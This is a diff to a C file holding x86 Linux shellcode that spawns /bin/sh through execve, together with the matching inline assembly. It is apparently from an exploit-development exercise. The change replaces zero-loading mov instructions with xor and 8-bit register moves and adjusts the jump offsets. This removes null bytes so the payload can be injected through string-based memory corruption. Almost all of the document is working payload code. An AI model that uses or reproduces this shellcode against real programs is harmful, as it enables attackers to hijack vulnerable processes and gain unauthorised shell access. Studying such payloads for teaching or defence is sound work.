@@ -1,14 +1,15 @@
 #include <stdio.h>
 
 char shellcode[] = 
-  "\xeb\x14"         
+  "\xeb\x0d"         
   "\x5e"            
-  "\xba\x00\x00\x00\x00"
-  "\xb9\x00\x00\x00\x00"
+  "\x31\xd2"
+  "\x31\xc9"
   "\x89\xf3"
-  "\xb8\x0b\x00\x00\x00"
+  "\x31\xc0"
+  "\xb0\x0b"
   "\xcd\x80"
-  "\xe8\xe7\xff\xff\xff"
+  "\xe8\xee\xff\xff\xff"
   "/bin/sh"
   ;
 
@@ -17,10 +18,11 @@ void call_asm(){
       "jmp _call_label \n"
       "_jmp_label: \n"
       "pop %esi \n"
-      "mov $0x0,%edx \n"
-      "mov $0x0,%ecx \n"
+      "xor %edx,%edx \n"
+      "xor %ecx,%ecx \n"
       "mov %esi,%ebx \n"
-      "mov $0xb,%eax \n"
+      "xor %eax,%eax \n"
+      "mov $0xb,%al \n"
       "int $0x80 \n"
       "_call_label: \n"
       "call _jmp_label \n"
